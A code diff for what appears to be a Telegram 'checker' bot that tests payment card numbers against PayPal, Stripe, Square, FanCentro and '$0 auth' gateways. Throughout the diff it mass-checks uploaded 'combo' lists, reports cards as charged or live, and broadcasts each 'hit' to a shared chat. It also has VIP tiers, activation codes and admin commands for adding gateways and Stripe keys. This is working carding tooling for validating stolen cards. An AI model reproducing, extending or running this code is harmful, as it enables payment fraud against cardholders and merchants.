@@ -941,248 +906,22 @@ def check_auth_sync(card):
             session.close()
         except:
             pass
-
+            # ==================== Send Hit ====================
 async def send_hit(context, chat_id, hit_counter, username, status_text, response, gateway_name):
-    """إرسال رسالة الهيت"""
     hit_text = f"""⚡ 𝗵𝗶𝘁 𝗗𝗲𝘁𝗲𝗰𝘁𝗲𝗱 #{hit_counter} 📌
 - - - - - - - - - - - - - - - - - - - - - -
 ⚡ 𝐔𝐬𝐞𝐫: @{username}
 ⚡ 𝐒𝐭𝐚𝐭𝐮𝐬: {status_text}
 ⚡ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <code>{response}</code>
 ⚡ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: {gateway_name}
-- - - - - - - - - - - - - - - - - - - - -
+- - - - - - - - - - - - - - - - - - - - - -
 🤖 checker v1"""
     try:
         await context.bot.send_message(chat_id=HIT_CHAT_ID, text=premium_emoji(hit_text), parse_mode="HTML")
     except:
         pass
 
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    ALL_USERS.add(user_id)
-    username = update.effective_user.username or "No Username"
-    keyboard = [
-        [InlineKeyboardButton("🤖 Free Commands", callback_data="free_cmds")],
-        [InlineKeyboardButton("💎 VIP Commands", callback_data="vip_cmds")],
-        [InlineKeyboardButton("👑 Admin Commands", callback_data="admin_cmds")],
-        [InlineKeyboardButton("💳 Check", callback_data="check_panel"), InlineKeyboardButton("📊 Stats", callback_data="stats_panel")],
-    ]
-    await update.message.reply_text(premium_emoji(f"⚡ Welcome! @{username} ⚡\n- - - - - - - - - - - - - - - - - - - - - -\n🚀 Bot Status: Online"), parse_mode="HTML", reply_markup=InlineKeyboardMarkup(keyboard))
-
-async def free_cmds_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_to_start")]]
-    await query.edit_message_text(premium_emoji("🤖 FREE COMMANDS:\n• /start - Start\n• /cmds - Commands\n• /pp [card] - PayPal single\n• /st [card] - Stripe single\n• /sq [card] - Square single\n• /auth [card] - Auth $0 check\n• /stop - Stop mass\n• /code [key] - Activate VIP"), parse_mode="HTML", reply_markup=InlineKeyboardMarkup(keyboard))
-
-async def vip_cmds_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_to_start")]]
-    await query.edit_message_text(premium_emoji("💎 VIP COMMANDS:\n• Upload combo file - Mass checking\n• /st [card] - Stripe single\n• /sq [card] - Square single\n• /auth [card] - Auth $0 check"), parse_mode="HTML", reply_markup=InlineKeyboardMarkup(keyboard))
-
-async def admin_cmds_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    user_id = query.from_user.id
-    if user_id not in ADMINS:
-        await query.answer("Admin only!", show_alert=True)
-        return
-    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_to_start")]]
-    await query.edit_message_text(premium_emoji("👑 ADMIN COMMANDS:\n• /add [url] - Add gateway\n• /rmadd [num] - Remove gateway\n• /show_gateways - Show gateways\n• /ban_user [id] - Ban user\n• /unban_user [id] - Unban user\n• /prm [id] [days] - Add VIP\n• /rmprm [id] - Remove VIP\n• /addkey [pk] [sk] - Add Stripe key\n• /rmkey [id] - Remove Stripe key\n• /wafa [days] [max] - Generate codes\n• /SENT [msg] - Broadcast"), parse_mode="HTML", reply_markup=InlineKeyboardMarkup(keyboard))
-
-async def check_panel_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    keyboard = [
-        [InlineKeyboardButton("💳 PayPal", callback_data="check_paypal")],
-        [InlineKeyboardButton("💳 Stripe", callback_data="check_stripe")],
-        [InlineKeyboardButton("💳 Square", callback_data="check_square")],
-        [InlineKeyboardButton("🛡 Auth $0", callback_data="check_auth")],
-        [InlineKeyboardButton("🔙 Back", callback_data="back_to_start")],
-    ]
-    await query.edit_message_text(premium_emoji("💳 Choose check type:"), parse_mode="HTML", reply_markup=InlineKeyboardMarkup(keyboard))
-
-async def check_paypal_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    await query.edit_message_text(premium_emoji("💳 Send card:\n<code>/pp [card]</code>"), parse_mode="HTML")
-
-async def check_stripe_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    await query.edit_message_text(premium_emoji("💳 Send card:\n<code>/st [card]</code>"), parse_mode="HTML")
-
-async def check_square_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    await query.edit_message_text(premium_emoji("💳 Send card:\n<code>/sq [card]</code>"), parse_mode="HTML")
-
-async def check_auth_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    await query.edit_message_text(premium_emoji("🛡 Send card:\n<code>/auth [card]</code>"), parse_mode="HTML")
-
-async def stats_panel_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_to_start")]]
-    await query.edit_message_text(premium_emoji(f"📊 STATS:\n👥 Users: {len(ALL_USERS)}\n🌐 Gateways: {len(GATEWAYS)}\n🔑 Stripe Keys: {len(STRIPE_KEYS)}"), parse_mode="HTML", reply_markup=InlineKeyboardMarkup(keyboard))
-
-async def back_to_start_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    user_id = query.from_user.id
-    username = query.from_user.username or "No Username"
-    keyboard = [
-        [InlineKeyboardButton("🤖 Free Commands", callback_data="free_cmds")],
-        [InlineKeyboardButton("💎 VIP Commands", callback_data="vip_cmds")],
-        [InlineKeyboardButton("👑 Admin Commands", callback_data="admin_cmds")],
-        [InlineKeyboardButton("💳 Check", callback_data="check_panel"), InlineKeyboardButton("📊 Stats", callback_data="stats_panel")],
-    ]
-    await query.edit_message_text(premium_emoji(f"⚡ Welcome! @{username} ⚡\n- - - - - - - - - - - - - - - - - - - - - -\n🚀 Bot Status: Online"), parse_mode="HTML", reply_markup=InlineKeyboardMarkup(keyboard))
-
-async def show_gateways(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if update.effective_user.id not in ADMINS:
-        return
-    if not GATEWAYS:
-        await update.message.reply_text(premium_emoji("❌ No gateways."), parse_mode="HTML")
-        return
-    keyboard = []
-    for i, gateway in enumerate(GATEWAYS, 1):
-        keyboard.append([InlineKeyboardButton(f"🌐 Gate #{i}", callback_data=f"gate_info_{i}")])
-    keyboard.append([InlineKeyboardButton("🔙 Close", callback_data="close_gateways")])
-    await update.message.reply_text(premium_emoji(f"🌐 <b>Gateways ({len(GATEWAYS)}):</b>\n\nChoose a gateway to manage:"), parse_mode="HTML", reply_markup=InlineKeyboardMarkup(keyboard))
-
-async def gate_info_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    user_id = query.from_user.id
-    if user_id not in ADMINS:
-        return
-    gate_num = int(query.data.split("_")[2])
-    if 1 <= gate_num <= len(GATEWAYS):
-        gateway_url = GATEWAYS[gate_num - 1]
-        keyboard = [
-            [InlineKeyboardButton("🗑 Remove", callback_data=f"gate_remove_{gate_num}")],
-            [InlineKeyboardButton("🔙 Back", callback_data="back_to_gateways")],
-        ]
-        await query.edit_message_text(premium_emoji(f"🌐 <b>Gateway #{gate_num}:</b>\n<code>{gateway_url}</code>\n\nChoose action:"), parse_mode="HTML", reply_markup=InlineKeyboardMarkup(keyboard))
-
-async def gate_remove_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    user_id = query.from_user.id
-    if user_id not in ADMINS:
-        return
-    gate_num = int(query.data.split("_")[2])
-    if 1 <= gate_num <= len(GATEWAYS):
-        GATEWAYS.pop(gate_num - 1)
-        keyboard = []
-        for i, gateway in enumerate(GATEWAYS, 1):
-            keyboard.append([InlineKeyboardButton(f"🌐 Gate #{i}", callback_data=f"gate_info_{i}")])
-        keyboard.append([InlineKeyboardButton("🔙 Close", callback_data="close_gateways")])
-        await query.edit_message_text(premium_emoji(f"🗑 <b>Gateway #{gate_num} removed!</b>\n\n🌐 <b>Remaining ({len(GATEWAYS)}):</b>"), parse_mode="HTML", reply_markup=InlineKeyboardMarkup(keyboard))
-
-async def back_to_gateways_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    if not GATEWAYS:
-        await query.edit_message_text(premium_emoji("❌ No gateways."), parse_mode="HTML")
-        return
-    keyboard = []
-    for i, gateway in enumerate(GATEWAYS, 1):
-        keyboard.append([InlineKeyboardButton(f"🌐 Gate #{i}", callback_data=f"gate_info_{i}")])
-    keyboard.append([InlineKeyboardButton("🔙 Close", callback_data="close_gateways")])
-    await query.edit_message_text(premium_emoji(f"🌐 <b>Gateways ({len(GATEWAYS)}):</b>\n\nChoose a gateway to manage:"), parse_mode="HTML", reply_markup=InlineKeyboardMarkup(keyboard))
-
-async def close_gateways_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    await query.delete_message()
-
-async def cmds(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    commands_text = """👑 ADMIN:
-• /add [url] - Add PayPal gateway
-• /rmadd [num] - Remove gateway
-• /show_gateways - Show gateways
-• /ban_user [id] - Ban user
-• /unban_user [id] - Unban user
-• /prm [id] [days] - Add VIP
-• /rmprm [id] - Remove VIP
-• /wafa [days] [max] - Generate keys
-• /show_users - Show users
-• /try [id] [msg] - DM user
-• /SENT [msg] - Broadcast
-• /addkey [pk] [sk] - Add Stripe key
-• /rmkey [id] - Remove Stripe key
-
-💎 VIP:
-• Upload combo file - Mass checking
-• /st [card] - Stripe single
-• /sq [card] - Square single
-• /auth [card] - Auth $0 check
-
-🤖 FREE:
-• /start - Start
-• /cmds - Commands
-• /pp [card] - PayPal single
-• /st [card] - Stripe single
-• /sq [card] - Square single
-• /auth [card] - Auth $0 check
-• /stop - Stop mass
-• /code [key] - Activate VIP"""
-    await update.message.reply_text(premium_emoji(commands_text), parse_mode="HTML")
-
-async def pp(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    global hit_counter, gateway_index
-    user_id = update.effective_user.id
-    ALL_USERS.add(user_id)
-    
-    if user_id not in ADMINS and (user_id not in VIP_USERS or VIP_USERS[user_id] < time.time()):
-        now = time.time()
-        if now - last_check_time.get(user_id, 0) < ANTI_SPAM_SECONDS:
-            await update.message.reply_text(premium_emoji(f"⏳ Wait {ANTI_SPAM_SECONDS}s."), parse_mode="HTML")
-            return
-        last_check_time[user_id] = now
-    
-    if not context.args:
-        await update.message.reply_text(premium_emoji("💡 Usage: <code>/pp [card]</code>"), parse_mode="HTML")
-        return
-    
-    card_full = " ".join(context.args)
-    gateway_num = 0
-    gateway_url = None
-    gateway_name = "PayPal"
-    
-    if GATEWAYS:
-        gateway_num = (gateway_index % len(GATEWAYS)) + 1
-        gateway_url = GATEWAYS[gateway_index % len(GATEWAYS)]
-        gateway_index += 1
-        
-        if 'stripe' in gateway_url.lower():
-            gateway_name = "Stripe"
-        elif 'square' in gateway_url.lower():
-            gateway_name = "Square"
-        elif 'auth' in gateway_url.lower():
-            gateway_name = "Auth $0"
-    
-    status, response = await check_card_api(card_full, gateway_url)
-    text = await format_response(card_full, status, response, 0, gateway_url, gateway_num, user_id, "Single")
-    await update.message.reply_text(text, parse_mode="HTML")
-    
-    if status == "approved" or status == "live":
-        hit_counter += 1
-        user = update.effective_user
-        username = user.username or user.first_name or "Unknown"
-        
-        if status == "approved":
-            status_text = "🔥 Charge" if "CHARGE" in str(response).upper() else "🔥 Approved"
-        else:
-            status_text = "💵 Insufficient Funds"
-        
-        await send_hit(context, update.effective_chat.id, hit_counter, username, status_text, response, gateway_name)
-
+# ==================== Format PayPal ====================
 async def format_response(card_full, status, response, taken, gateway_url, gateway_num, user_id, mode="Single"):
     bin_number = card_full.split("|")[0][:6]
     info, bank, country = await get_bin_info(bin_number)
@@ -1218,6 +957,7 @@ async def format_response(card_full, status, response, taken, gateway_url, gatew
 - - - - - - - - - - - - - - - - - - - - - -
 🤖 checker v1""")
 
+# ==================== Format Stripe ====================
 async def format_stripe_response(card_full, result, taken, user_id, mode="Single"):
     bin_number = card_full.split("|")[0][:6]
     info, bank, country = await get_bin_info(bin_number)
@@ -1254,6 +994,7 @@ async def format_stripe_response(card_full, result, taken, user_id, mode="Single
 - - - - - - - - - - - - - - - - - - - - - -
 🤖 checker v1""")
 
+# ==================== Format Square ====================
 async def format_square_response(card_full, result, taken, user_id, mode="Single"):
     bin_number = card_full.split("|")[0][:6]
     info, bank, country = await get_bin_info(bin_number)
@@ -1286,6 +1027,7 @@ async def format_square_response(card_full, result, taken, user_id, mode="Single
 - - - - - - - - - - - - - - - - - - - - - -
 🤖 checker v1""")
 
+# ==================== Format Auth ====================
 async def format_auth_response(card_full, result_dict, taken, user_id, mode="Single"):
     bin_number = card_full.split("|")[0][:6]
     info, bank, country = await get_bin_info(bin_number)
@@ -1320,8 +1062,222 @@ async def format_auth_response(card_full, result_dict, taken, user_id, mode="Sin
 - - - - - - - - - - - - - - - - - - - - - -
 🤖 checker v1""")
 
-async def auth_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    global hit_counter
+# ==================== Format FanCentro ====================
+async def fan_format_response(card_full, result, user_id, mode="Single"):
+    bin_number = card_full.split("|")[0][:6]
+    info, bank, country = await get_bin_info(bin_number)
+    result_upper = result.upper()
+    if "CHARGE" in result_upper:
+        status_emoji, status_text = "🔥", "Charge 5$"
+    elif "INSUFFICIENT" in result_upper:
+        status_emoji, status_text = "💵", "Insufficient Funds"
+    elif "DEAD" in result_upper:
+        status_emoji, status_text = "❌", "Dead"
+    elif "DECLINED" in result_upper:
+        status_emoji, status_text = "❌", "Declined"
+    else:
+        status_emoji, status_text = "⚠️", result[:30]
+    user_status = "Admin 👑" if user_id in ADMINS else ("Premium 💎" if user_id in VIP_USERS and VIP_USERS[user_id] > time.time() else "Free User 🤖")
+    return premium_emoji(f"""💳 #FanCentro [{mode}]
+- - - - - - - - - - - - - - - - - - - - - -
+💳 Card: <code>{card_full}</code>
+⚡ Response: <code>{result}</code>
+{status_emoji} Status: {status_text}
+- - - - - - - - - - - - - - - - - - - - - -
+📌 Info: <code>{info}</code>
+🏦 Bank: <code>{bank}</code>
+🌐 Country: <code>{country}</code>
+👤 Req By: <code>{user_id}</code> ({user_status})
+- - - - - - - - - - - - - - - - - - - - - -
+🤖 checker v1""")
+# ==================== Start ====================
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    ALL_USERS.add(user_id)
+    username = update.effective_user.username or "No Username"
+    keyboard = [
+        [InlineKeyboardButton("🤖 Free Commands", callback_data="free_cmds")],
+        [InlineKeyboardButton("💎 VIP Commands", callback_data="vip_cmds")],
+        [InlineKeyboardButton("👑 Admin Commands", callback_data="admin_cmds")],
+        [InlineKeyboardButton("💳 Check", callback_data="check_panel"), InlineKeyboardButton("📊 Stats", callback_data="stats_panel")],
+    ]
+    await update.message.reply_text(premium_emoji(f"⚡ Welcome! @{username} ⚡\n- - - - - - - - - - - - - - - - - - - - - -\n🚀 Bot Status: Online"), parse_mode="HTML", reply_markup=InlineKeyboardMarkup(keyboard))
+
+# ==================== Callbacks ====================
+async def free_cmds_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_to_start")]]
+    await query.edit_message_text(premium_emoji("🤖 FREE COMMANDS:\n• /start - Start\n• /cmds - Commands\n• /pp [card] - PayPal single\n• /st [card] - Stripe single\n• /sq [card] - Square single\n• /auth [card] - Auth $0 check\n• /cb [card] - FanCentro check\n• /stop - Stop mass\n• /code [key] - Activate VIP"), parse_mode="HTML", reply_markup=InlineKeyboardMarkup(keyboard))
+
+async def vip_cmds_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_to_start")]]
+    await query.edit_message_text(premium_emoji("💎 VIP COMMANDS:\n• Upload combo file - Mass checking\n• /st [card] - Stripe single\n• /sq [card] - Square single\n• /auth [card] - Auth $0 check\n• /cb [card] - FanCentro check"), parse_mode="HTML", reply_markup=InlineKeyboardMarkup(keyboard))
+
+async def admin_cmds_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    user_id = query.from_user.id
+    if user_id not in ADMINS:
+        await query.answer("Admin only!", show_alert=True)
+        return
+    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_to_start")]]
+    await query.edit_message_text(premium_emoji("👑 ADMIN COMMANDS:\n• /add [url] - Add gateway\n• /rmadd [num] - Remove gateway\n• /show_gateways - Show gateways\n• /ban_user [id] - Ban user\n• /unban_user [id] - Unban user\n• /prm [id] [days] - Add VIP\n• /rmprm [id] - Remove VIP\n• /addkey [pk] [sk] - Add Stripe key\n• /rmkey [id] - Remove Stripe key\n• /wafa [days] [max] - Generate codes\n• /SENT [msg] - Broadcast"), parse_mode="HTML", reply_markup=InlineKeyboardMarkup(keyboard))
+
+async def check_panel_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    keyboard = [
+        [InlineKeyboardButton("💳 PayPal", callback_data="check_paypal")],
+        [InlineKeyboardButton("💳 Stripe", callback_data="check_stripe")],
+        [InlineKeyboardButton("💳 Square", callback_data="check_square")],
+        [InlineKeyboardButton("💳 FanCentro", callback_data="check_fancentro")],
+        [InlineKeyboardButton("🛡 Auth $0", callback_data="check_auth")],
+        [InlineKeyboardButton("🔙 Back", callback_data="back_to_start")],
+    ]
+    await query.edit_message_text(premium_emoji("💳 Choose check type:"), parse_mode="HTML", reply_markup=InlineKeyboardMarkup(keyboard))
+
+async def check_paypal_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    await query.edit_message_text(premium_emoji("💳 Send card:\n<code>/pp [card]</code>"), parse_mode="HTML")
+
+async def check_stripe_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    await query.edit_message_text(premium_emoji("💳 Send card:\n<code>/st [card]</code>"), parse_mode="HTML")
+
+async def check_square_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    await query.edit_message_text(premium_emoji("💳 Send card:\n<code>/sq [card]</code>"), parse_mode="HTML")
+
+async def check_fancentro_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    await query.edit_message_text(premium_emoji("💳 Send card:\n<code>/cb [card]</code>"), parse_mode="HTML")
+
+async def check_auth_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    await query.edit_message_text(premium_emoji("🛡 Send card:\n<code>/auth [card]</code>"), parse_mode="HTML")
+
+async def stats_panel_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_to_start")]]
+    await query.edit_message_text(premium_emoji(f"📊 STATS:\n👥 Users: {len(ALL_USERS)}\n🌐 Gateways: {len(GATEWAYS)}\n🔑 Stripe Keys: {len(STRIPE_KEYS)}"), parse_mode="HTML", reply_markup=InlineKeyboardMarkup(keyboard))
+
+async def back_to_start_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    username = query.from_user.username or "No Username"
+    keyboard = [
+        [InlineKeyboardButton("🤖 Free Commands", callback_data="free_cmds")],
+        [InlineKeyboardButton("💎 VIP Commands", callback_data="vip_cmds")],
+        [InlineKeyboardButton("👑 Admin Commands", callback_data="admin_cmds")],
+        [InlineKeyboardButton("💳 Check", callback_data="check_panel"), InlineKeyboardButton("📊 Stats", callback_data="stats_panel")],
+    ]
+    await query.edit_message_text(premium_emoji(f"⚡ Welcome! @{username} ⚡\n- - - - - - - - - - - - - - - - - - - - - -\n🚀 Bot Status: Online"), parse_mode="HTML", reply_markup=InlineKeyboardMarkup(keyboard))
+
+# ==================== Gateways Callbacks ====================
+async def show_gateways(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.effective_user.id not in ADMINS: return
+    if not GATEWAYS:
+        await update.message.reply_text(premium_emoji("❌ No gateways."), parse_mode="HTML")
+        return
+    keyboard = []
+    for i, gateway in enumerate(GATEWAYS, 1):
+        keyboard.append([InlineKeyboardButton(f"🌐 Gate #{i}", callback_data=f"gate_info_{i}")])
+    keyboard.append([InlineKeyboardButton("🔙 Close", callback_data="close_gateways")])
+    await update.message.reply_text(premium_emoji(f"🌐 <b>Gateways ({len(GATEWAYS)}):</b>\n\nChoose a gateway to manage:"), parse_mode="HTML", reply_markup=InlineKeyboardMarkup(keyboard))
+
+async def gate_info_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    user_id = query.from_user.id
+    if user_id not in ADMINS: return
+    gate_num = int(query.data.split("_")[2])
+    if 1 <= gate_num <= len(GATEWAYS):
+        gateway_url = GATEWAYS[gate_num - 1]
+        keyboard = [
+            [InlineKeyboardButton("🗑 Remove", callback_data=f"gate_remove_{gate_num}")],
+            [InlineKeyboardButton("🔙 Back", callback_data="back_to_gateways")],
+        ]
+        await query.edit_message_text(premium_emoji(f"🌐 <b>Gateway #{gate_num}:</b>\n<code>{gateway_url}</code>\n\nChoose action:"), parse_mode="HTML", reply_markup=InlineKeyboardMarkup(keyboard))
+
+async def gate_remove_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    user_id = query.from_user.id
+    if user_id not in ADMINS: return
+    gate_num = int(query.data.split("_")[2])
+    if 1 <= gate_num <= len(GATEWAYS):
+        GATEWAYS.pop(gate_num - 1)
+        keyboard = []
+        for i, gateway in enumerate(GATEWAYS, 1):
+            keyboard.append([InlineKeyboardButton(f"🌐 Gate #{i}", callback_data=f"gate_info_{i}")])
+        keyboard.append([InlineKeyboardButton("🔙 Close", callback_data="close_gateways")])
+        await query.edit_message_text(premium_emoji(f"🗑 <b>Gateway #{gate_num} removed!</b>\n\n🌐 <b>Remaining ({len(GATEWAYS)}):</b>"), parse_mode="HTML", reply_markup=InlineKeyboardMarkup(keyboard))
+
+async def back_to_gateways_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    if not GATEWAYS:
+        await query.edit_message_text(premium_emoji("❌ No gateways."), parse_mode="HTML")
+        return
+    keyboard = []
+    for i, gateway in enumerate(GATEWAYS, 1):
+        keyboard.append([InlineKeyboardButton(f"🌐 Gate #{i}", callback_data=f"gate_info_{i}")])
+    keyboard.append([InlineKeyboardButton("🔙 Close", callback_data="close_gateways")])
+    await query.edit_message_text(premium_emoji(f"🌐 <b>Gateways ({len(GATEWAYS)}):</b>\n\nChoose a gateway to manage:"), parse_mode="HTML", reply_markup=InlineKeyboardMarkup(keyboard))
+
+async def close_gateways_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    await query.delete_message()
+
+# ==================== Commands ====================
+async def cmds(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    commands_text = """👑 ADMIN:
+• /add [url] - Add PayPal gateway
+• /rmadd [num] - Remove gateway
+• /show_gateways - Show gateways
+• /ban_user [id] - Ban user
+• /unban_user [id] - Unban user
+• /prm [id] [days] - Add VIP
+• /rmprm [id] - Remove VIP
+• /wafa [days] [max] - Generate keys
+• /show_users - Show users
+• /try [id] [msg] - DM user
+• /SENT [msg] - Broadcast
+• /addkey [pk] [sk] - Add Stripe key
+• /rmkey [id] - Remove Stripe key
+
+💎 VIP:
+• Upload combo file - Mass checking
+• /st [card] - Stripe single
+• /sq [card] - Square single
+• /auth [card] - Auth $0 check
+• /cb [card] - FanCentro check
+
+🤖 FREE:
+• /start - Start
+• /cmds - Commands
+• /pp [card] - PayPal single
+• /st [card] - Stripe single
+• /sq [card] - Square single
+• /auth [card] - Auth $0 check
+• /cb [card] - FanCentro check
+• /stop - Stop mass
+• /code [key] - Activate VIP"""
+    await update.message.reply_text(premium_emoji(commands_text), parse_mode="HTML")
+
+# ==================== PP Handler ====================
+async def pp(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    global hit_counter, gateway_index
     user_id = update.effective_user.id
     ALL_USERS.add(user_id)
     if user_id not in ADMINS and (user_id not in VIP_USERS or VIP_USERS[user_id] < time.time()):
@@ -1331,27 +1287,30 @@ async def auth_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
             return
         last_check_time[user_id] = now
     if not context.args:
-        await update.message.reply_text(premium_emoji("💡 Usage: <code>/auth [card]</code>"), parse_mode="HTML")
+        await update.message.reply_text(premium_emoji("💡 Usage: <code>/pp [card]</code>"), parse_mode="HTML")
         return
-    card = context.args[0]
-    msg = await update.message.reply_text(premium_emoji("🛡 Auth Checking..."), parse_mode="HTML")
-    start_time = time.time()
-    loop = asyncio.get_event_loop()
-    result_dict = await loop.run_in_executor(None, check_auth_sync, card)
-    taken = round(time.time() - start_time, 2)
-    text = await format_auth_response(card, result_dict, taken, user_id, "Single")
-    await msg.edit_text(text, parse_mode="HTML")
-
-    status = result_dict.get('status', 'declined')
-    if status == "approved":
+    card_full = " ".join(context.args)
+    gateway_num = 0
+    gateway_url = None
+    gateway_name = "PayPal"
+    if GATEWAYS:
+        gateway_num = (gateway_index % len(GATEWAYS)) + 1
+        gateway_url = GATEWAYS[gateway_index % len(GATEWAYS)]
+        gateway_index += 1
+        if 'stripe' in gateway_url.lower(): gateway_name = "Stripe"
+        elif 'square' in gateway_url.lower(): gateway_name = "Square"
+        elif 'auth' in gateway_url.lower(): gateway_name = "Auth $0"
+    status, response = await check_card_api(card_full, gateway_url)
+    text = await format_response(card_full, status, response, 0, gateway_url, gateway_num, user_id, "Single")
+    await update.message.reply_text(text, parse_mode="HTML")
+    if status == "approved" or status == "live":
         hit_counter += 1
         user = update.effective_user
         username = user.username or user.first_name or "Unknown"
-        status_text = "🔥 Approved"
-        response = result_dict.get('message', '')
-        gateway_name = "Auth $0"
+        status_text = "🔥 Charge" if status == "approved" else "💵 Insufficient Funds"
         await send_hit(context, update.effective_chat.id, hit_counter, username, status_text, response, gateway_name)
 
+# ==================== ST Handler ====================
 async def st_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
     global hit_counter
     user_id = update.effective_user.id
@@ -1369,30 +1328,26 @@ async def st_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(premium_emoji("💡 Usage: <code>/st [card]</code>"), parse_mode="HTML")
         return
     card = context.args[0]
-    msg = await update.message.reply_text(premium_emoji("💳 Checking..."), parse_mode="HTML")
+    msg = await update.message.reply_text(premium_emoji("💳 Checking Stripe..."), parse_mode="HTML")
     start_time = time.time()
     loop = asyncio.get_event_loop()
     result = await loop.run_in_executor(None, check_stripe_sync, card)
     taken = round(time.time() - start_time, 2)
     text = await format_stripe_response(card, result, taken, user_id, "Single")
     await msg.edit_text(text, parse_mode="HTML")
-
     result_upper = str(result).upper()
     if "CHARGE" in result_upper or "SUCCEEDED" in result_upper:
         hit_counter += 1
         user = update.effective_user
         username = user.username or user.first_name or "Unknown"
-        status_text = "🔥 Charge"
-        gateway_name = "Stripe"
-        await send_hit(context, update.effective_chat.id, hit_counter, username, status_text, result, gateway_name)
+        await send_hit(context, update.effective_chat.id, hit_counter, username, "🔥 Charge", result, "Stripe")
     elif "INSUFFICIENT" in result_upper or "LIVE" in result_upper:
         hit_counter += 1
         user = update.effective_user
         username = user.username or user.first_name or "Unknown"
-        status_text = "💵 Insufficient Funds"
-        gateway_name = "Stripe"
-        await send_hit(context, update.effective_chat.id, hit_counter, username, status_text, result, gateway_name)
+        await send_hit(context, update.effective_chat.id, hit_counter, username, "💵 Insufficient Funds", result, "Stripe")
 
+# ==================== SQ Handler ====================
 async def sq_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
     global hit_counter
     user_id = update.effective_user.id
@@ -1414,22 +1369,80 @@ async def sq_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
     taken = round(time.time() - start_time, 2)
     text = await format_square_response(card, result, taken, user_id, "Single")
     await msg.edit_text(text, parse_mode="HTML")
-
     if "CHARGE" in result:
         hit_counter += 1
         user = update.effective_user
         username = user.username or user.first_name or "Unknown"
-        status_text = "🔥 Charge"
-        gateway_name = "Square"
-        await send_hit(context, update.effective_chat.id, hit_counter, username, status_text, result, gateway_name)
+        await send_hit(context, update.effective_chat.id, hit_counter, username, "🔥 Charge", result, "Square")
     elif "LIVE" in result:
         hit_counter += 1
         user = update.effective_user
         username = user.username or user.first_name or "Unknown"
-        status_text = "💵 Insufficient Funds"
-        gateway_name = "Square"
-        await send_hit(context, update.effective_chat.id, hit_counter, username, status_text, result, gateway_name)
+        await send_hit(context, update.effective_chat.id, hit_counter, username, "💵 Insufficient Funds", result, "Square")
 
+# ==================== Auth Handler ====================
+async def auth_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    global hit_counter
+    user_id = update.effective_user.id
+    ALL_USERS.add(user_id)
